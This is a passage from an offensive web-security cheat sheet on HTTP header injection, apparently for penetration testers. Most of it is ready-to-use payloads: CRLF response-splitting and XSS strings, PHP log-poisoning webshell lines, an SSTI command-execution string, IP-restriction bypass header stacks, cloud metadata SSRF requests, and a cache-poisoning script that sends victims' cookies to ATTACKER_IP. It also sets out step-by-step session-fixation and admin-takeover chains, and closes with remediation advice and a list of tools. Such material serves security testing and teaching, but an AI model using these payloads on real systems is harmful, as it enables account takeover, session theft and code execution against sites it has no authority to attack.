%0d%0aContent-Type:%20application/json%0d%0a%0d%0a{"status":"hacked","data":"injected"}
```

```text [Change Content-Type to SVG (XSS)]
%0d%0aContent-Type:%20image/svg+xml%0d%0a%0d%0a<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"/>
```

```text [Content-Disposition — Force Download]
%0d%0aContent-Disposition:%20attachment;%20filename=malware.exe%0d%0aContent-Type:%20application/octet-stream%0d%0a%0d%0aMalicious content here
```

```text [Content-Disposition — Filename Injection]
%0d%0aContent-Disposition:%20attachment;%20filename="evil.html"%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('Downloaded XSS')</script>
```
::

### Log Injection via Headers

Applications that log HTTP headers without sanitization are vulnerable to log injection, enabling **log forging**, **log poisoning**, and **log-based attacks**.

::collapsible
---
label: "Log Injection / Log Poisoning Payloads"
---

```text [Inject Fake Log Entry — User-Agent]
User-Agent: Mozilla/5.0%0d%0a127.0.0.1 - admin [01/Jan/2024:00:00:00] "GET /admin HTTP/1.1" 200 1234
```

```text [Log Forging — Hide Attack]
User-Agent: Normal%0d%0a192.168.1.1 - - [01/Jan/2024:00:00:00] "GET / HTTP/1.1" 200 OK%0d%0a
```

```text [PHP Log Poisoning (for LFI)]
User-Agent: <?php system($_GET['cmd']); ?>
```

```text [PHP Log Poisoning — Stealthy]
User-Agent: Mozilla/5.0 <?php passthru($_REQUEST['c']); ?>
```

```text [Python Code in Logs]
User-Agent: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

```text [SSTI via User-Agent]
User-Agent: {{7*7}}
```

```text [Log Injection via Referer]
Referer: http://normal-site.com%0d%0aFake-Entry: injected
```

```text [Log Injection via X-Forwarded-For]
X-Forwarded-For: 127.0.0.1%0d%0a[FORGED LOG ENTRY]
```

```text [Clear Log Lines]
User-Agent: %0d%0a%0d%0a%0d%0a%0d%0a%0d%0a
```
::

### Server-Side Request Forgery (SSRF) via Headers

::collapsible
---
label: "SSRF Header Payloads"
---

```http [X-Forwarded-For — Bypass IP Filtering]
X-Forwarded-For: 127.0.0.1
```

```http [X-Real-IP — Bypass IP Filtering]
X-Real-IP: 127.0.0.1
```

```http [X-Originating-IP]
X-Originating-IP: 127.0.0.1
```

```http [X-Remote-IP]
X-Remote-IP: 127.0.0.1
```

```http [X-Remote-Addr]
X-Remote-Addr: 127.0.0.1
```

```http [X-Client-IP]
X-Client-IP: 127.0.0.1
```

```http [True-Client-IP (Akamai)]
True-Client-IP: 127.0.0.1
```

```http [CF-Connecting-IP (CloudFlare)]
CF-Connecting-IP: 127.0.0.1
```

```http [Fastly-Client-IP]
Fastly-Client-IP: 127.0.0.1
```

```http [X-Azure-ClientIP]
X-Azure-ClientIP: 127.0.0.1
```

```http [X-Original-Forwarded-For]
X-Original-Forwarded-For: 127.0.0.1
```

```http [Forwarded Header (RFC 7239)]
Forwarded: for=127.0.0.1;by=127.0.0.1;host=localhost
```

```http [Multiple Forwarded IPs — Bypass First Check]
X-Forwarded-For: legitimate-ip, 127.0.0.1
```

```http [X-Forwarded-For — Internal Network Scan]
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 172.16.0.1
X-Forwarded-For: 192.168.1.1
```

```http [AWS Metadata Access via Host]
Host: 169.254.169.254
X-Forwarded-For: 127.0.0.1
```

```http [GCP Metadata Access]
Host: metadata.google.internal
Metadata-Flavor: Google
```

```http [Full SSRF Header Stack]
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
```
::

### WebSocket Header Injection

::collapsible
---
label: "WebSocket Hijacking Payloads"
---

```http [WebSocket Origin Bypass]
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: http://ATTACKER_DOMAIN
```

```http [WebSocket with Injected Cookie]
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Cookie: session=stolen_session_id
```

```http [WebSocket Protocol Injection]
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: admin%0d%0aInjected:true
```
::

---

## Privilege Escalation via Header Injection

::note
Header injection can serve as a **direct escalation vector** or provide the foothold needed for further privilege escalation. The attack surface depends on what the application does with header values.
::

### Escalation Paths

::card-group
  ::card
  ---
  title: "Session Fixation → Account Takeover"
  icon: i-lucide-user-check
  ---
  Inject `Set-Cookie` headers to fix a known session ID on the victim. When the victim authenticates, the attacker uses the same session ID to access the authenticated session — gaining the victim's privileges.
  ::

  ::card
  ---
  title: "Admin Panel Access via Host Header"
  icon: i-lucide-shield-alert
  ---
  Modify the `Host` header to access internal virtual hosts (`admin.target.com`, `localhost`, `127.0.0.1`) that serve admin interfaces not accessible from the public internet.
  ::

  ::card
  ---
  title: "Password Reset Takeover"
  icon: i-lucide-key-round
  ---
  Poison the `Host` header during password reset to redirect reset tokens to attacker-controlled servers. Use the token to reset any user's password, including administrators.
  ::

  ::card
  ---
  title: "IP-Based Access Control Bypass"
  icon: i-lucide-lock-open
  ---
  Inject `X-Forwarded-For: 127.0.0.1` to bypass IP-based restrictions on admin panels, APIs, and management interfaces.
  ::

  ::card
  ---
  title: "Cache Poisoning → Stored XSS"
  icon: i-lucide-database
  ---
  Poison web caches with malicious JavaScript that executes for **all users** who access the cached page — including administrators. Steal admin session tokens for full application takeover.
  ::

  ::card
  ---
  title: "Request Smuggling → Request Hijack"
  icon: i-lucide-package
  ---
  Smuggle requests to hijack other users' requests, steal their authentication headers, or make them perform unauthorized actions. Can escalate to admin-level access.
  ::

  ::card
  ---
  title: "CORS Misconfiguration Exploitation"
  icon: i-lucide-globe
  ---
  Inject `Access-Control-Allow-Origin` headers to enable cross-origin requests from attacker domains. Steal sensitive data from authenticated API endpoints via the victim's browser.
  ::

  ::card
  ---
  title: "Security Header Stripping"
  icon: i-lucide-shield-off
  ---
  Override or remove security headers (`CSP`, `X-Frame-Options`, `HSTS`) to enable downstream attacks (XSS, clickjacking, protocol downgrade) that would otherwise be blocked.
  ::
::

### Session Fixation Attack Chain

::steps{level="4"}

#### Inject Known Session Cookie

Craft a URL with CRLF injection that sets a known session ID:

```text
https://target.com/page?param=value%0d%0aSet-Cookie:%20PHPSESSID=ATTACKER_KNOWN_SESSION_ID;%20Path=/
```

#### Deliver to Victim

Send the crafted URL to the victim via email, chat, or any social engineering channel.

#### Victim Authenticates

The victim clicks the link, receives the `Set-Cookie` header with the attacker's session ID, and then logs in. The server now associates the attacker's session ID with the victim's authenticated session.

#### Attacker Hijacks Session

The attacker uses the known session ID to access the application as the authenticated victim:

```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: PHPSESSID=ATTACKER_KNOWN_SESSION_ID
```

::

### IP Restriction Bypass Chain

::steps{level="4"}

#### Identify Admin Panel

Discover admin endpoints that return `403 Forbidden` or redirect when accessed externally.

```text
/admin
/admin/dashboard
/management
/internal
/_admin
```

#### Test IP-Based Bypass Headers

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

#### Cycle Through All IP Bypass Headers

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded: for=127.0.0.1
```

#### Access Granted — Escalate

Once access is achieved, enumerate admin functionality and escalate further.

::

### Cache Poisoning → Mass Account Takeover

::steps{level="4"}

#### Identify Cached Pages

Look for pages with caching headers (`Cache-Control`, `X-Cache`, `Age`, `CF-Cache-Status`).

```http
GET /login HTTP/1.1
Host: target.com
```

Response contains:
```http
X-Cache: HIT
Cache-Control: public, max-age=3600
```

#### Poison Cache with XSS

```text
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: ATTACKER_DOMAIN"></script><script>document.location='http://ATTACKER_IP/?c='+document.cookie</script><script x="
```

If the `X-Forwarded-Host` value is reflected in cached HTML (e.g., in asset URLs, canonical links, or meta tags), the XSS executes for every user who loads the cached page.

#### Steal Admin Sessions

The injected JavaScript sends session cookies of every user (including admins) to the attacker's server.

#### Take Over Admin Account

Use the stolen admin session token to access the admin panel.

::

---

## Advanced Techniques

### HTTP/2 Header Injection

HTTP/2 uses binary framing instead of text-based CRLF delimiters. However, when HTTP/2 front-ends communicate with HTTP/1.1 back-ends (**H2C smuggling**), header injection is still possible.

::collapsible
---
label: "HTTP/2 Specific Techniques"
---

```text [H2C Smuggling — Upgrade Header]
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
Connection: Upgrade, HTTP2-Settings
HTTP2-Settings: AAEAABAAAAIAAAAAAQAN
```

```text [HTTP/2 Pseudo-Header Injection]
:method: GET
:path: / HTTP/1.1\r\nHost: ATTACKER_DOMAIN\r\n\r\n
:authority: target.com
:scheme: https
```

```text [HTTP/2 CRLF in Header Value]
Header-Name: value\r\nInjected-Header: evil
```

```text [HTTP/2 Header Name Injection]
The HTTP/2 binary format prevents traditional CRLF injection in header names, but downgrade to HTTP/1.1 on the backend can reintroduce the vulnerability.
```

::tip
Test for HTTP/2 downgrade by sending requests with HTTP/2 and checking if the backend processes them as HTTP/1.1. Use tools like `h2csmuggler` for automated testing.
::
::

### Hop-by-Hop Header Abuse

Hop-by-hop headers are processed and removed by proxies. Abusing them can strip security headers or authentication tokens from requests.

::collapsible
---
label: "Hop-by-Hop Header Abuse Payloads"
---

```http [Strip X-Forwarded-For (Hide Real IP)]
GET / HTTP/1.1
Host: target.com
Connection: close, X-Forwarded-For
X-Forwarded-For: 127.0.0.1
```

```http [Strip Authorization Header]
GET /api/admin HTTP/1.1
Host: target.com
Connection: close, Authorization
Authorization: Bearer admin_token
```

```http [Strip Cookie Header]
GET /admin HTTP/1.1
Host: target.com
Connection: close, Cookie
Cookie: session=admin_session
```

```http [Strip Custom Auth Header]
GET /api/data HTTP/1.1
Host: target.com
Connection: close, X-API-Key
X-API-Key: secret_key
```

```http [Strip X-Real-IP]
GET / HTTP/1.1
Host: target.com
Connection: close, X-Real-IP
X-Real-IP: 10.0.0.1
```

```http [Strip Cache-Control]
GET /page HTTP/1.1
Host: target.com
Connection: close, Cache-Control
Cache-Control: no-cache
```

```http [Strip Multiple Headers]
GET / HTTP/1.1
Host: target.com
Connection: close, X-Forwarded-For, X-Real-IP, Authorization, Cookie
```

The proxy removes the headers listed in the `Connection` header before forwarding the request to the backend. This can bypass backend security checks that rely on these headers.
::

### Request Header Injection via URL

Some applications fetch URLs provided by users. If the URL parsing is flawed, headers can be injected.

::collapsible
---
label: "URL-Based Header Injection"
---

```text [CRLF in URL Path]
http://target.com/page%0d%0aInjected-Header:%20value
```

```text [CRLF in URL Parameter]
http://target.com/page?param=value%0d%0aInjected:%20true
```

```text [Header Injection via URL Fragment]
http://target.com/page%23%0d%0aInjected:%20true
```

```text [Host Header via @ in URL]
http://ATTACKER_DOMAIN@target.com/path
```

```text [CRLF in Redirect URL]
http://target.com/redirect?url=http://legitimate.com%0d%0aSet-Cookie:%20session=evil
```

```text [CRLF in Fetch/SSRF URL]
http://target.com/fetch?url=http://internal:8080/%0d%0aHost:%20evil.com
```

```text [Newline in URL — Python requests]
http://target.com/api\r\nX-Injected: true\r\n
```

```text [CRLF via Gopher Protocol (SSRF)]
gopher://target.com:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aInjected:%20true%0d%0a%0d%0a
```
::

---

## Attack Methodology

::steps{level="3"}

### Reconnaissance

Map all input vectors that could influence HTTP headers.


  ::field{name="URL Parameters" type="string"}
  Test all query parameters that appear in redirect URLs, Set-Cookie values, or custom response headers.
  ::

  ::field{name="Form Fields" type="string"}
  Email fields in contact forms (email header injection), username/preference fields stored in cookies.
  ::

  ::field{name="HTTP Headers" type="string"}
  `Host`, `User-Agent`, `Referer`, `X-Forwarded-For`, `Accept-Language`, `Cookie` — any header the application processes.
  ::

  ::field{name="API Parameters" type="string"}
  REST/GraphQL parameters that influence response headers (pagination links, content negotiation, CORS handling).
  ::

  ::field{name="Filename/Path" type="string"}
  File upload names, download paths, and URL path segments that reflect in `Content-Disposition` or `Location` headers.
  ::

  ::field{name="Caching Infrastructure" type="indicator"}
  Identify CDN/proxy layers (CloudFlare, Varnish, Nginx, Akamai) from response headers. These amplify cache poisoning attacks.
  ::


### Detection

Test each injection point systematically.

```text [Step 1 — Basic CRLF Test]
param=value%0d%0aX-Test:injected
```

Check if `X-Test: injected` appears as a separate header in the response.

```text [Step 2 — Body Injection Test]
param=value%0d%0a%0d%0a<h1>TEST</h1>
```

Check if HTML content appears in the response body.

```text [Step 3 — Host Header Test]
Host: evil.com
X-Forwarded-Host: evil.com
```

Check if application behavior changes with modified Host headers.

### Exploitation

Select the appropriate technique based on the injection point and target architecture.

| Injection Point | Primary Attack | Secondary Attack |
|----------------|----------------|------------------|
| Redirect URL | Open Redirect, Response Splitting | Cache Poisoning, XSS |
| Cookie Value | Session Fixation | Session Hijacking |
| Custom Header | Security Header Override | CORS Bypass |
| Host Header | Password Reset Poisoning | Cache Poisoning, SSRF |
| Email Field | Email Header Injection | Spam Relay, Phishing |
| Log Entry | Log Forging | Log Poisoning (LFI→RCE) |
| Proxy/CDN | Cache Poisoning | Stored XSS at Scale |

### Impact Assessment

Document the full impact chain from initial injection to maximum achievable privilege.

### Reporting

Record all payloads, responses, and evidence with clear reproduction steps.

::

---

## Impact Summary

| Attack Type | Severity | Impact |
|------------|----------|--------|
| CRLF → XSS via Response Splitting | **Critical** | Execute arbitrary JavaScript in victim's browser |
| CRLF → Session Fixation | **High** | Account takeover via forced session ID |
| Host Header → Password Reset Poisoning | **Critical** | Take over any user account including admin |
| Host Header → Cache Poisoning | **Critical** | Serve malicious content to all users from cache |
| CRLF → Security Header Bypass | **High** | Enable clickjacking, XSS, protocol downgrade |
| Request Smuggling | **Critical** | Hijack other users' requests, bypass security controls |
| Email Header Injection | **Medium** | Spam relay, phishing, email spoofing |
| SSRF via Headers | **High** | Access internal services, cloud metadata, admin panels |
| IP Bypass via Headers | **High** | Access restricted endpoints, admin panels |
| CORS Header Injection | **High** | Cross-origin data theft from authenticated sessions |
| Log Poisoning | **Medium-High** | Log forging, potential RCE via LFI |
| Cache Deception | **High** | Cache authenticated responses for unauthenticated access |

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Strip CRLF Characters
  icon: i-lucide-shield-check
  ---
  Remove or reject `\r` (0x0D) and `\n` (0x0A) characters from **all** user input before placing it in HTTP headers. Apply this at the framework level, not just application code.
  ::

  ::card
  ---
  title: Use Framework Header APIs
  icon: i-lucide-code
  ---
  Use built-in framework functions for setting headers and cookies instead of manual string concatenation. Modern frameworks like Django, Rails, Express, and Spring automatically sanitize header values.
  ::

  ::card
  ---
  title: Validate Host Header
  icon: i-lucide-server
  ---
  Maintain an **allowlist** of valid Host header values. Reject requests with unrecognized Host headers. Never use the Host header value to construct URLs for emails, redirects, or cached content.
  ::

  ::card
  ---
  title: Ignore X-Forwarded Headers
  icon: i-lucide-eye-off
  ---
  Only trust `X-Forwarded-For`, `X-Forwarded-Host`, and similar headers from **known, trusted proxies**. Configure your reverse proxy to overwrite (not append) these headers.
  ::

  ::card
  ---
  title: Cache Key Configuration
  icon: i-lucide-database
  ---
  Include all security-relevant headers in cache keys. Use `Vary` headers appropriately. Never cache responses that include user-specific data without proper cache segmentation.
  ::

  ::card
  ---
  title: Email Input Validation
  icon: i-lucide-mail
  ---
  Strictly validate email addresses with regex. Reject any email input containing `\r`, `\n`, `%0d`, `%0a`, `Bcc:`, `Cc:`, `To:`, or `Subject:` strings.
  ::

  ::card
  ---
  title: Consistent HTTP Parsing
  icon: i-lucide-layers
  ---
  Ensure front-end and back-end servers use **identical** HTTP parsing behavior for `Content-Length` and `Transfer-Encoding` to prevent request smuggling.
  ::

  ::card
  ---
  title: Security Headers
  icon: i-lucide-shield
  ---
  Implement and enforce security headers server-side where they cannot be overridden by injection:

  ```text
  Content-Security-Policy: default-src 'self'
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-XSS-Protection: 0
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  ```
  ::

  ::card
  ---
  title: WAF Rules
  icon: i-lucide-brick-wall
  ---
  Deploy WAF rules to detect and block CRLF sequences (`%0d%0a`, `%0d`, `%0a`, `\r\n`) in request parameters, headers, and URLs.
  ::

  ::card
  ---
  title: HTTP/2 End-to-End
  icon: i-lucide-zap
  ---
  Use HTTP/2 or HTTP/3 end-to-end (not just client-to-proxy) to eliminate text-based header parsing vulnerabilities. Avoid HTTP/2-to-HTTP/1.1 downgrade on backends.
  ::
::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Intercept and modify HTTP headers in real-time. Use Repeater for manual testing and Intruder for automated CRLF payload fuzzing. Scanner detects header injection automatically.
  ::

  ::card
  ---
  title: CRLFuzz
  icon: i-lucide-terminal
  to: https://github.com/dwisiswant0/crlfuzz
  target: _blank
  ---
  Fast CRLF vulnerability scanner written in Go. Scans multiple URLs with various CRLF payloads and encoding techniques.
  ::

  ::card
  ---
  title: CRLF Injector
  icon: i-lucide-syringe
  to: https://github.com/MichaelStott/CRLF-Injection-Scanner
  target: _blank
  ---
  Python-based scanner for detecting CRLF injection vulnerabilities across multiple parameters and endpoints.
  ::

  ::card
  ---
  title: smuggler
  icon: i-lucide-package
  to: https://github.com/defparam/smuggler
  target: _blank
  ---
  HTTP Request Smuggling detection tool. Tests CL.TE, TE.CL, and TE.TE variants with various encoding tricks.
  ::

  ::card
  ---
  title: h2csmuggler
  icon: i-lucide-arrow-right-left
  to: https://github.com/BishopFox/h2cSmuggler
  target: _blank
  ---
  HTTP/2 cleartext (h2c) smuggling tool for bypassing reverse proxies and accessing internal services.
  ::

  ::card
  ---
  title: Param Miner (Burp Extension)
  icon: i-lucide-search
  to: https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
  target: _blank
  ---
  Discovers hidden HTTP parameters and headers that the application processes. Essential for finding cache poisoning and header injection vectors.
  ::

  ::card
  ---
  title: Web Cache Vulnerability Scanner
  icon: i-lucide-database
  to: https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
  target: _blank
  ---
  Automated tool for detecting web cache poisoning vulnerabilities through header injection and parameter manipulation.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-zap
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzer for testing CRLF payloads across multiple parameters. Use with custom wordlists containing encoded CRLF sequences.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-atom
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based scanner with built-in CRLF injection, host header injection, and request smuggling detection templates.
  ::
::